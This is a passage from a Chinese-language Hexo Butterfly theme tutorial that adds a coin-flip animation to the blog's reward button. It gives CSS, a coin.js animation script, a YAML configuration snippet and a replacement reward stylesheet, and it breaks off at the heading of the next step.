class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">z-index</span>: <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.coin__front</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">radial-gradient</span>(circle at <span class="number">50%</span> <span class="number">50%</span>, transparent <span class="number">50%</span>, <span class="built_in">rgba</span>(<span class="number">115</span>, <span class="number">124</span>, <span class="number">153</span>, <span class="number">0.4</span>) <span class="number">54%</span>, <span class="number">#c2cadf</span> <span class="number">54%</span>),</span><br><span class="line">    <span class="built_in">linear-gradient</span>(<span class="number">210deg</span>, <span class="number">#8590b3</span> <span class="number">32%</span>, transparent <span class="number">32%</span>), <span class="built_in">linear-gradient</span>(<span class="number">150deg</span>, <span class="number">#8590b3</span> <span class="number">32%</span>, transparent <span class="number">32%</span>),</span><br><span class="line">    <span class="built_in">linear-gradient</span>(to right, <span class="number">#8590b3</span> <span class="number">22%</span>, transparent <span class="number">22%</span>, transparent <span class="number">78%</span>, <span class="number">#8590b3</span> <span class="number">78%</span>), <span class="built_in">linear-gradient</span>(</span><br><span class="line">      to bottom,</span><br><span class="line">      <span class="number">#fcfaf9</span> <span class="number">44%</span>,</span><br><span class="line">      transparent <span class="number">44%</span>,</span><br><span class="line">      transparent <span class="number">65%</span>,</span><br><span class="line">      <span class="number">#fcfaf9</span> <span class="number">65%</span>,</span><br><span class="line">      <span class="number">#fcfaf9</span> <span class="number">71%</span>,</span><br><span class="line">      <span class="number">#8590b3</span> <span class="number">71%</span></span><br><span class="line">    ), <span class="built_in">linear-gradient</span>(to right, transparent <span class="number">28%</span>, <span class="number">#fcfaf9</span> <span class="number">28%</span>, <span class="number">#fcfaf9</span> <span class="number">34%</span>, <span class="number">#8590b3</span> <span class="number">34%</span>, <span class="number">#8590b3</span> <span class="number">40%</span>, <span class="number">#fcfaf9</span> <span class="number">40%</span>, <span class="number">#fcfaf9</span></span><br><span class="line">        <span class="number">47%</span>, <span class="number">#8590b3</span> <span class="number">47%</span>, <span class="number">#8590b3</span> <span class="number">53%</span>, <span class="number">#fcfaf9</span> <span class="number">53%</span>, <span class="number">#fcfaf9</span> <span class="number">60%</span>, <span class="number">#8590b3</span> <span class="number">60%</span>, <span class="number">#8590b3</span> <span class="number">66%</span>, <span class="number">#fcfaf9</span> <span class="number">66%</span>, <span class="number">#fcfaf9</span> <span class="number">72%</span>, transparent</span><br><span class="line">        <span class="number">72%</span>);</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#8590b3</span>;</span><br><span class="line">  <span class="attribute">background-size</span>: <span class="number">100%</span> <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">transform</span>: <span class="built_in">translateY</span>(<span class="built_in">calc</span>(<span class="built_in">var</span>(--front-y-multiplier) * <span class="number">0.3181818182rem</span> / <span class="number">2</span>)) <span class="built_in">scaleY</span>(<span class="built_in">var</span>(--front-scale-multiplier));</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.coin__front</span><span class="selector-pseudo">::after</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.2</span>);</span><br><span class="line">  <span class="attribute">content</span>: <span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="attribute">opacity</span>: <span class="built_in">var</span>(--front-y-multiplier);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.coin__middle</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="number">#737c99</span>;</span><br><span class="line">  <span class="attribute">transform</span>: <span class="built_in">translateY</span>(<span class="built_in">calc</span>(<span class="built_in">var</span>(--middle-y-multiplier) * <span class="number">0.3181818182rem</span> / <span class="number">2</span>)) <span class="built_in">scaleY</span>(<span class="built_in">var</span>(--middle-scale-multiplier));</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.coin__back</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">radial-gradient</span>(circle at <span class="number">50%</span> <span class="number">50%</span>, transparent <span class="number">50%</span>, <span class="built_in">rgba</span>(<span class="number">115</span>, <span class="number">124</span>, <span class="number">153</span>, <span class="number">0.4</span>) <span class="number">54%</span>, <span class="number">#c2cadf</span> <span class="number">54%</span>),</span><br><span class="line">    <span class="built_in">radial-gradient</span>(circle at <span class="number">50%</span> <span class="number">40%</span>, <span class="number">#fcfaf9</span> <span class="number">23%</span>, transparent <span class="number">23%</span>), <span class="built_in">radial-gradient</span>(circle at <span class="number">50%</span> <span class="number">100%</span>, <span class="number">#fcfaf9</span> <span class="number">35%</span>, transparent</span><br><span class="line">        <span class="number">35%</span>);</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#8590b3</span>;</span><br><span class="line">  <span class="attribute">background-size</span>: <span class="number">100%</span> <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">transform</span>: <span class="built_in">translateY</span>(<span class="built_in">calc</span>(<span class="built_in">var</span>(--back-y-multiplier) * <span class="number">0.3181818182rem</span> / <span class="number">2</span>)) <span class="built_in">scaleY</span>(<span class="built_in">var</span>(--back-scale-multiplier));</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.coin__back</span><span class="selector-pseudo">::after</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.2</span>);</span><br><span class="line">  <span class="attribute">content</span>: <span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="attribute">opacity</span>: <span class="built_in">var</span>(--back-y-multiplier);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.coin</span><span class="selector-pseudo">::before</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">radial-gradient</span>(circle at <span class="number">25%</span> <span class="number">65%</span>, transparent <span class="number">50%</span>, <span class="built_in">rgba</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0.9</span>) <span class="number">90%</span>), <span class="built_in">linear-gradient</span>(<span class="number">55deg</span>, transparent</span><br><span class="line">        <span class="built_in">calc</span>(<span class="built_in">var</span>(--shine-bg-multiplier) + <span class="number">0%</span>), <span class="number">#e9f4ff</span> <span class="built_in">calc</span>(<span class="built_in">var</span>(--shine-bg-multiplier) + <span class="number">0%</span>), transparent <span class="built_in">calc</span>(<span class="built_in">var</span>(</span><br><span class="line">              --shine-bg-multiplier</span><br><span class="line">            ) + <span class="number">50%</span>));</span><br><span class="line">  <span class="attribute">content</span>: <span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="attribute">opacity</span>: <span class="built_in">var</span>(--shine-opacity-multiplier);</span><br><span class="line">  <span class="attribute">transform</span>: <span class="built_in">translateY</span>(<span class="built_in">calc</span>(<span class="built_in">var</span>(--middle-y-multiplier) * <span class="number">0.3181818182rem</span> / -<span class="number">2</span>)) <span class="built_in">scaleY</span>(<span class="built_in">var</span>(--middle-scale-multiplier))</span><br><span class="line">    <span class="built_in">rotate</span>(<span class="built_in">calc</span>(<span class="built_in">var</span>(--coin-rotation-multiplier) * <span class="number">1deg</span>));</span><br><span class="line">  <span class="attribute">z-index</span>: <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.coin</span><span class="selector-pseudo">::after</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="number">#737c99</span>;</span><br><span class="line">  <span class="attribute">content</span>: <span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">0.3181818182rem</span>;</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">50%</span>;</span><br><span class="line">  <span class="attribute">transform</span>: <span class="built_in">translateY</span>(-<span class="number">50%</span>);</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">z-index</span>: <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@keyframes</span> shake &#123;</span><br><span class="line">  <span class="number">0%</span> &#123;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">rotate</span>(<span class="number">4deg</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">66%</span> &#123;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">rotate</span>(-<span class="number">4deg</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">100%</span> &#123;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">rotate</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-新建-Blogroot-source-js-coin-coin-js"><a href="#4-新建-Blogroot-source-js-coin-coin-js" class="headerlink" title="4.  新建[Blogroot]\source\js\coin\coin.js"></a>4.  新建<code>[Blogroot]\source\js\coin\coin.js</code></h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> tipButtons = <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&quot;.tip-button&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">coinAudio</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> coinAudio = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;coinAudio&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (coinAudio) &#123;</span><br><span class="line">    coinAudio.<span class="title function_">play</span>(); <span class="comment">//有音频时播放</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Loop through all buttons (allows for multiple buttons on page)</span></span><br><span class="line">tipButtons.<span class="title function_">forEach</span>(<span class="function"><span class="params">button</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">var</span> coin = button.<span class="title function_">querySelector</span>(<span class="string">&quot;.coin&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// The larger the number, the slower the animation</span></span><br><span class="line">  coin.<span class="property">maxMoveLoopCount</span> = <span class="number">90</span>;</span><br><span class="line"></span><br><span class="line">  button.<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="regexp">/Android|webOS|BlackBerry/i</span>.<span class="title function_">test</span>(navigator.<span class="property">userAgent</span>)) <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">//媒体选择</span></span><br><span class="line">    <span class="keyword">if</span> (button.<span class="property">clicked</span>) <span class="keyword">return</span>;</span><br><span class="line">    button.<span class="property">classList</span>.<span class="title function_">add</span>(<span class="string">&quot;clicked&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Wait to start flipping th coin because of the button tilt animation</span></span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="comment">// Randomize the flipping speeds just for fun</span></span><br><span class="line">      coin.<span class="property">sideRotationCount</span> = <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * <span class="number">5</span>) * <span class="number">90</span>;</span><br><span class="line">      coin.<span class="property">maxFlipAngle</span> = (<span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * <span class="number">4</span>) + <span class="number">3</span>) * <span class="title class_">Math</span>.<span class="property">PI</span>;</span><br><span class="line">      button.<span class="property">clicked</span> = <span class="literal">true</span>;</span><br><span class="line">      <span class="title function_">flipCoin</span>();</span><br><span class="line">      <span class="title function_">coinAudio</span>();</span><br><span class="line">    &#125;, <span class="number">50</span>);</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> <span class="title function_">flipCoin</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    coin.<span class="property">moveLoopCount</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="title function_">flipCoinLoop</span>();</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> <span class="title function_">resetCoin</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    coin.<span class="property">style</span>.<span class="title function_">setProperty</span>(<span class="string">&quot;--coin-x-multiplier&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    coin.<span class="property">style</span>.<span class="title function_">setProperty</span>(<span class="string">&quot;--coin-scale-multiplier&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    coin.<span class="property">style</span>.<span class="title function_">setProperty</span>(<span class="string">&quot;--coin-rotation-multiplier&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    coin.<span class="property">style</span>.<span class="title function_">setProperty</span>(<span class="string">&quot;--shine-opacity-multiplier&quot;</span>, <span class="number">0.4</span>);</span><br><span class="line">    coin.<span class="property">style</span>.<span class="title function_">setProperty</span>(<span class="string">&quot;--shine-bg-multiplier&quot;</span>, <span class="string">&quot;50%&quot;</span>);</span><br><span class="line">    coin.<span class="property">style</span>.<span class="title function_">setProperty</span>(<span class="string">&quot;opacity&quot;</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// Delay to give the reset animation some time before you can click again</span></span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      button.<span class="property">clicked</span> = <span class="literal">false</span>;</span><br><span class="line">    &#125;, <span class="number">300</span>);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> <span class="title function_">flipCoinLoop</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    coin.<span class="property">moveLoopCount</span>++;</span><br><span class="line">    <span class="keyword">var</span> percentageCompleted = coin.<span class="property">moveLoopCount</span> / coin.<span class="property">maxMoveLoopCount</span>;</span><br><span class="line">    coin.<span class="property">angle</span> = -coin.<span class="property">maxFlipAngle</span> * <span class="title class_">Math</span>.<span class="title function_">pow</span>(percentageCompleted - <span class="number">1</span>, <span class="number">2</span>) + coin.<span class="property">maxFlipAngle</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Calculate the scale and position of the coin moving through the air</span></span><br><span class="line">    coin.<span class="property">style</span>.<span class="title function_">setProperty</span>(<span class="string">&quot;--coin-y-multiplier&quot;</span>, -<span class="number">11</span> * <span class="title class_">Math</span>.<span class="title function_">pow</span>(percentageCompleted * <span class="number">2</span> - <span class="number">1</span>, <span class="number">4</span>) + <span class="number">11</span>);</span><br><span class="line">    coin.<span class="property">style</span>.<span class="title function_">setProperty</span>(<span class="string">&quot;--coin-x-multiplier&quot;</span>, percentageCompleted);</span><br><span class="line">    coin.<span class="property">style</span>.<span class="title function_">setProperty</span>(<span class="string">&quot;--coin-scale-multiplier&quot;</span>, percentageCompleted * <span class="number">0.6</span>);</span><br><span class="line">    coin.<span class="property">style</span>.<span class="title function_">setProperty</span>(<span class="string">&quot;--coin-rotation-multiplier&quot;</span>, percentageCompleted * coin.<span class="property">sideRotationCount</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Calculate the scale and position values for the different coin faces</span></span><br><span class="line">    <span class="comment">// The math uses sin/cos wave functions to similate the circular motion of 3D spin</span></span><br><span class="line">    coin.<span class="property">style</span>.<span class="title function_">setProperty</span>(<span class="string">&quot;--front-scale-multiplier&quot;</span>, <span class="title class_">Math</span>.<span class="title function_">max</span>(<span class="title class_">Math</span>.<span class="title function_">cos</span>(coin.<span class="property">angle</span>), <span class="number">0</span>));</span><br><span class="line">    coin.<span class="property">style</span>.<span class="title function_">setProperty</span>(<span class="string">&quot;--front-y-multiplier&quot;</span>, <span class="title class_">Math</span>.<span class="title function_">sin</span>(coin.<span class="property">angle</span>));</span><br><span class="line"></span><br><span class="line">    coin.<span class="property">style</span>.<span class="title function_">setProperty</span>(<span class="string">&quot;--middle-scale-multiplier&quot;</span>, <span class="title class_">Math</span>.<span class="title function_">abs</span>(<span class="title class_">Math</span>.<span class="title function_">cos</span>(coin.<span class="property">angle</span>), <span class="number">0</span>));</span><br><span class="line">    coin.<span class="property">style</span>.<span class="title function_">setProperty</span>(<span class="string">&quot;--middle-y-multiplier&quot;</span>, <span class="title class_">Math</span>.<span class="title function_">cos</span>((coin.<span class="property">angle</span> + <span class="title class_">Math</span>.<span class="property">PI</span> / <span class="number">2</span>) % <span class="title class_">Math</span>.<span class="property">PI</span>));</span><br><span class="line"></span><br><span class="line">    coin.<span class="property">style</span>.<span class="title function_">setProperty</span>(<span class="string">&quot;--back-scale-multiplier&quot;</span>, <span class="title class_">Math</span>.<span class="title function_">max</span>(<span class="title class_">Math</span>.<span class="title function_">cos</span>(coin.<span class="property">angle</span> - <span class="title class_">Math</span>.<span class="property">PI</span>), <span class="number">0</span>));</span><br><span class="line">    coin.<span class="property">style</span>.<span class="title function_">setProperty</span>(<span class="string">&quot;--back-y-multiplier&quot;</span>, <span class="title class_">Math</span>.<span class="title function_">sin</span>(coin.<span class="property">angle</span> - <span class="title class_">Math</span>.<span class="property">PI</span>));</span><br><span class="line"></span><br><span class="line">    coin.<span class="property">style</span>.<span class="title function_">setProperty</span>(<span class="string">&quot;--shine-opacity-multiplier&quot;</span>, <span class="number">4</span> * <span class="title class_">Math</span>.<span class="title function_">sin</span>((coin.<span class="property">angle</span> + <span class="title class_">Math</span>.<span class="property">PI</span> / <span class="number">2</span>) % <span class="title class_">Math</span>.<span class="property">PI</span>) - <span class="number">3.2</span>);</span><br><span class="line">    coin.<span class="property">style</span>.<span class="title function_">setProperty</span>(<span class="string">&quot;--shine-bg-multiplier&quot;</span>, -<span class="number">40</span> * (<span class="title class_">Math</span>.<span class="title function_">cos</span>((coin.<span class="property">angle</span> + <span class="title class_">Math</span>.<span class="property">PI</span> / <span class="number">2</span>) % <span class="title class_">Math</span>.<span class="property">PI</span>) - <span class="number">0.5</span>) + <span class="string">&quot;%&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Repeat animation loop</span></span><br><span class="line">    <span class="keyword">if</span> (coin.<span class="property">moveLoopCount</span> &lt; coin.<span class="property">maxMoveLoopCount</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (coin.<span class="property">moveLoopCount</span> === coin.<span class="property">maxMoveLoopCount</span> - <span class="number">6</span>) button.<span class="property">classList</span>.<span class="title function_">add</span>(<span class="string">&quot;shrink-landing&quot;</span>);</span><br><span class="line">      <span class="variable language_">window</span>.<span class="title function_">requestAnimationFrame</span>(flipCoinLoop);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      button.<span class="property">classList</span>.<span class="title function_">add</span>(<span class="string">&quot;coin-landed&quot;</span>);</span><br><span class="line">      coin.<span class="property">style</span>.<span class="title function_">setProperty</span>(<span class="string">&quot;opacity&quot;</span>, <span class="number">0</span>);</span><br><span class="line">      <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        button.<span class="property">classList</span>.<span class="title function_">remove</span>(<span class="string">&quot;clicked&quot;</span>, <span class="string">&quot;shrink-landing&quot;</span>, <span class="string">&quot;coin-landed&quot;</span>);</span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">          <span class="title function_">resetCoin</span>();</span><br><span class="line">        &#125;, <span class="number">300</span>);</span><br><span class="line">      &#125;, <span class="number">1500</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="5-修改-config-butterfly-yml-添加音频文件配置项，添加-CDN-配置项："><a href="#5-修改-config-butterfly-yml-添加音频文件配置项，添加-CDN-配置项：" class="headerlink" title="5. 修改_config.butterfly.yml,添加音频文件配置项，添加 CDN 配置项："></a>5. 修改<code>_config.butterfly.yml</code>,添加音频文件配置项，添加 CDN 配置项：</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment"># Sponsor/reward</span></span><br><span class="line">  <span class="attr">reward:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line"><span class="string">+</span>   <span class="attr">coinAudio:</span> <span class="string">https://cdn.cbd.int/akilar-candyassets@1.0.36/audio/aowu.m4a</span></span><br><span class="line">    <span class="attr">QR_code:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">img:</span> <span class="string">https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png</span></span><br><span class="line">        <span class="attr">link:</span></span><br><span class="line">        <span class="attr">text:</span> <span class="string">wechat</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">img:</span> <span class="string">https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png</span></span><br><span class="line">        <span class="attr">link:</span></span><br><span class="line">        <span class="attr">text:</span> <span class="string">alipay</span></span><br><span class="line">  <span class="attr">CDN:</span></span><br><span class="line">    <span class="comment"># main</span></span><br><span class="line">    <span class="attr">main_css:</span> <span class="string">/css/index.css</span></span><br><span class="line">    <span class="attr">jquery:</span> <span class="string">https://cdn.cbd.int/jquery@latest/dist/jquery.min.js</span></span><br><span class="line">    <span class="attr">main:</span> <span class="string">/js/main.js</span></span><br><span class="line">    <span class="string">utils:/js/utils.js</span></span><br><span class="line">    <span class="attr">option:</span></span><br><span class="line"><span class="string">+</span>     <span class="comment"># 打赏按钮投币效果</span></span><br><span class="line"><span class="string">+</span>     <span class="attr">coin_js:</span> <span class="string">/js/coin/coin.js</span></span><br><span class="line"><span class="string">+</span>     <span class="attr">coin_css:</span> <span class="string">/css/coin/coin.css</span></span><br></pre></td></tr></table></figure><h3 id="6-修改-Blogroot-themes-butterfly-source-css-layout-reward-styl，整体替换为以下内容"><a href="#6-修改-Blogroot-themes-butterfly-source-css-layout-reward-styl，整体替换为以下内容" class="headerlink" title="6. 修改[Blogroot]\themes\butterfly\source\css\_layout\reward.styl，整体替换为以下内容"></a>6. 修改<code>[Blogroot]\themes\butterfly\source\css\_layout\reward.styl</code>，整体替换为以下内容</h3><p><strong>注意：如果打赏图片有两张的话，请将下列代码中的.reward-main模块中的width改为200%</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.post-reward</span></span><br><span class="line">  <span class="attribute">position</span>: relative</span><br><span class="line">  margin-top: <span class="number">4rem</span></span><br><span class="line">  width: <span class="number">100%</span></span><br><span class="line">  text-align: center</span><br><span class="line"></span><br><span class="line">  .reward-button</span><br><span class="line">    display: inline-block</span><br><span class="line">    padding: .<span class="number">2rem</span> <span class="number">1.2rem</span></span><br><span class="line">    background: <span class="built_in">var</span>(--btn-bg)</span><br><span class="line">    color: <span class="built_in">var</span>(--btn-color)</span><br><span class="line">    cursor: pointer</span><br><span class="line">    transition: all .<span class="number">4s</span></span><br><span class="line"></span><br><span class="line">    &amp;:hover</span><br><span class="line">      box-shadow: inset <span class="number">15em</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="built_in">var</span>(--btn-hover-color)</span><br><span class="line"></span><br><span class="line">      .reward-main</span><br><span class="line">        display: block</span><br><span class="line"></span><br><span class="line">    .reward-main</span><br><span class="line">      position: absolute</span><br><span class="line">      bottom: <span class="number">40px</span></span><br><span class="line">      left: -<span class="number">25%</span></span><br><span class="line">      z-index: <span class="number">100</span></span><br><span class="line">      display: none</span><br><span class="line">      padding: <span class="number">0</span> <span class="number">0</span> <span class="number">15px</span></span><br><span class="line">      width: <span class="number">150%</span></span><br><span class="line"></span><br><span class="line">      .reward-all</span><br><span class="line">        display: inline-block</span><br><span class="line">        margin: <span class="number">0</span></span><br><span class="line">        padding: <span class="number">1rem</span> .<span class="number">5rem</span></span><br><span class="line">        border-radius: <span class="number">4px</span></span><br><span class="line">        background: <span class="built_in">var</span>(--reward-pop)</span><br><span class="line"></span><br><span class="line">        &amp;:before</span><br><span class="line">          position: absolute</span><br><span class="line">          bottom: -<span class="number">10px</span></span><br><span class="line">          left: <span class="number">0</span></span><br><span class="line">          width: <span class="number">100%</span></span><br><span class="line">          height: <span class="number">20px</span></span><br><span class="line">          content: <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">        &amp;:after</span><br><span class="line">          position: absolute</span><br><span class="line">          right: <span class="number">0</span></span><br><span class="line">          bottom: <span class="number">2px</span></span><br><span class="line">          left: <span class="number">0</span></span><br><span class="line">          margin: <span class="number">0</span> auto</span><br><span class="line">          width: <span class="number">0</span></span><br><span class="line">          height: <span class="number">0</span></span><br><span class="line">          border-top: <span class="number">13px</span> solid <span class="built_in">var</span>(--reward-pop)</span><br><span class="line">          border-right: <span class="number">13px</span> solid transparent</span><br><span class="line">          border-left: <span class="number">13px</span> solid transparent</span><br><span class="line">          content: <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">        .reward-item</span><br><span class="line">          display: inline-block</span><br><span class="line">          padding: <span class="number">0</span> <span class="number">8px</span></span><br><span class="line">          list-style-type: none</span><br><span class="line">          vertical-align: top</span><br><span class="line"></span><br><span class="line">          img</span><br><span class="line">            width: <span class="number">130px</span></span><br><span class="line">            height: <span class="number">130px</span></span><br><span class="line"></span><br><span class="line">          .post-qr-code-desc</span><br><span class="line">            padding-top: .<span class="number">4rem</span></span><br><span class="line">            width: <span class="number">130px</span></span><br><span class="line">            color: $reward-pop-up-color</span><br></pre></td></tr></table></figure><h3 id="7-hexo三连"><a 